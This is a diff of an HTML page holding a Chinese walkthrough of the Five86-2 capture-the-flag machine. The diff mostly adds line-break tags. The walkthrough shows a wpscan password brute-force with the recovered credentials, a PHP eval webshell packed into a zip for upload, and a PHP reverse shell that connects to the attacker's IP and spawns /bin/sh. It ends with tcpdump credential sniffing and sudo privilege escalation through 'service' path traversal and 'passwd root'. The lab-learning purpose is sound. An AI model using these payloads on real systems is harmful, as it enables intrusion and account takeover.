@@ -7547,25 +7547,25 @@
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589785065630-02945079-928c-4930-a40b-45266f66dea2-655941.png" /></p>
 <p>访问 80 口（要改一下 hosts 文件）</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589785126238-20878795-8ff3-497d-a5e5-4a6a038f5cb1-424521.png" /></p>
-<p>是一个 wordpress，wpscan 来扫描一下看看有哪些用户
+<p>是一个 wordpress，wpscan 来扫描一下看看有哪些用户<br />
 wpscan --url http://five86-2/ -e u</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589787415764-636b6fde-e3d4-43a5-b34d-6bdefffd96d6-079051.png" /></p>
 <p>wpscan --url <a href="http://five86-2%20-P%20passwords.txt">http://five86-2 -P passwords.txt</a> -U users.txt 来爆破一下用户名和密码</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589787352473-5fe2d66a-bafc-47da-b4f3-4a4fd757f585-707870.png" /></p>
 <blockquote>
-<p>Username: barney, Password: spooky1
+<p>Username: barney, Password: spooky1<br />
 Username: stephen, Password: apollo1</p>
 </blockquote>
 <p>选一个登录一下，再 Add New 中新建一个 e-learning </p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589796774637-de1838d7-1f96-4583-a61d-27e787ba4df7-765935.png" /></p>
-<p>echo "<html>hello</html>" &gt; index.html
-echo "&lt;?php @eval ($_POST ['yichen']); ?&gt;" &gt; index.php
-zip poc.zip index.html index.php
+<p>echo "<html>hello</html>" &gt; index.html<br />
+echo "&lt;?php @eval ($_POST ['yichen']); ?&gt;" &gt; index.php<br />
+zip poc.zip index.html index.php<br />
 来生成一个 zip，然后上传，可以看到文件路径，直接访问那个 php 的后门</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589797800626-9d32a368-f283-4778-a816-bc8d5cb9455f-502731.png" /></p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1589797876697-6070242a-0f4e-43af-980a-7da18a2a0322-382435.png" /></p>
-<p>蚁剑连上，发现执行不了 nc 命令，在蚁剑的终端上也没法切换用户，然后写了个 system 的 php 也没法反弹 shell
-<img alt="image.png" src="../img/P13DD8mkarerCqyd/1589799020113-9005aa5d-7ecf-4113-96e0-3ebc50d9cc2d-330702.png" />
+<p>蚁剑连上，发现执行不了 nc 命令，在蚁剑的终端上也没法切换用户，然后写了个 system 的 php 也没法反弹 shell<br />
+<img alt="image.png" src="../img/P13DD8mkarerCqyd/1589799020113-9005aa5d-7ecf-4113-96e0-3ebc50d9cc2d-330702.png" /><br />
 找了个别的版本的 shell</p>
 <pre><code class="language-php">&lt;?php
 $ip = '192.168.149.141';
@@ -7580,32 +7580,32 @@ $process = proc_open('/bin/sh',$descriptorspec, $pipes);
 proc_close($process);
 ?&gt;
 </code></pre>
-<p>没有 python2 所以用的 python3
+<p>没有 python2 所以用的 python3<br />
 python3 -c "import pty;pty.spawn('/bin/bash')"</p>
-<p>切换到 stephen 用户
+<p>切换到 stephen 用户<br />
 Username: stephen, Password: apollo1</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590066071881-f1ebda92-34aa-4bbb-b127-946fb85142d4-288249.png" /></p>
-<p>ps -auxw
--a 显示同一终端下的所有程序
--aux 显示所有包含其他使用者的行程
+<p>ps -auxw<br />
+-a 显示同一终端下的所有程序<br />
+-aux 显示所有包含其他使用者的行程<br />
 -w 显示加宽可以显示较多的资讯</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590107929280-4107d4e1-66c2-4eab-bd02-8b9ad0fc7668-987780.png" /></p>
-<p>可以看到 ftp 是 paul 用户的跑的，ftp 大多数是明文传输，所以可以使用 tcpdump 抓包看一下看一下网卡信息
-stephen 用户是可以运行 tcpdump 的
+<p>可以看到 ftp 是 paul 用户的跑的，ftp 大多数是明文传输，所以可以使用 tcpdump 抓包看一下看一下网卡信息<br />
+stephen 用户是可以运行 tcpdump 的<br />
 cat /proc/net/dev</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590066697169-224fa372-fff4-41ce-9e21-2c17ad35bd7c-117531.png" /></p>
-<p>前面 timeout 设置一下时间，到时间就关掉进程
-timeout 150 tcpdump -i veth6b4bbb1 -w ftp.pcap
--i 指定网卡
+<p>前面 timeout 设置一下时间，到时间就关掉进程<br />
+timeout 150 tcpdump -i veth6b4bbb1 -w ftp.pcap<br />
+-i 指定网卡<br />
 -w 保存为文件而不是标准输出</p>
-<p>直接 cat 文件也可以看到，也可以放到 /tmp 目录，下载下来用 wrieshark 查看
+<p>直接 cat 文件也可以看到，也可以放到 /tmp 目录，下载下来用 wrieshark 查看<br />
 得到 ftp 账户：paul:esomepasswford</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590067582649-14868c94-2c3b-4707-a6a2-231bdd21b60d-041387.png" /></p>
 <p>尝试切换一下，成功</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590067706688-4382b657-b713-4676-bd3c-8ad6047a9c0e-325433.png" /></p>
 <p>sudo -l 发现一个不用密码的，可以直接切换到 pater 账户的 shell</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590067754371-89913519-e3f5-4e15-9286-340745fbb9ef-567198.png" /></p>
-<p>sudo -u peter service ../../../../../../bin/sh
+<p>sudo -u peter service ../../../../../../bin/sh<br />
 再次 sudo -l 发现可以执行 passwd 来修改密码</p>
 <p><img alt="image.png" src="../img/P13DD8mkarerCqyd/1590067848956-0e6b4c68-eb7c-46e6-99d4-7fe97a4c0e50-693600.png" /></p>
 <p>sudo passwd root 更改 root 的密码，然后切换到 root 用户就可以啦</p>
